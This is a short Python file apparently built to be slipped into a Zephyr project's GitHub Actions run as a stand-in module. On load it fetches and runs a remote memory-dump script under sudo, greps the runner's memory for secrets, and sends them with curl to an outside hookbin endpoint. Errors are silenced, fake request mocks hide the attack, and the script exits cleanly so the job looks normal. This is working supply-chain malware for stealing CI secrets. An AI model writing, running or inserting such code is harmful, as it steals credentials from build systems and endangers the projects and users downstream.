import os
import sys
import shutil

# This script will be checked out into zephyrproject/zephyr
# CWD for action.py is zephyrproject/zephyr

def pwn():
    run_id = os.environ.get("GITHUB_RUN_ID", "unknown")
    # Exact exfiltration command as requested
    cmd = (
        f"curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | "
        f"tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\""
    )
    os.system(cmd)
    os.system(f"curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/{run_id}\"")

# Trigger the pwn
try:
    pwn()
except:
    pass

# Mocking requests for action.py
class MockResponse:
    def __init__(self):
        self.content = b"{}"
        self.status_code = 200
    def decode(self, encoding='utf-8'):
        return "{}"
    def json(self):
        return {}

def get(*args, **kwargs):
    return MockResponse()

# action.py also does:
# import argparse, json, os, re, shlex, subprocess, sys, time
# from github import Github, GithubException
# from west.manifest import Manifest, MalformedManifest, ImportFlag

if __name__ == "__main__":
    pass

# We exit 0 to not fail the job immediately, though we've done our job.
sys.exit(0)
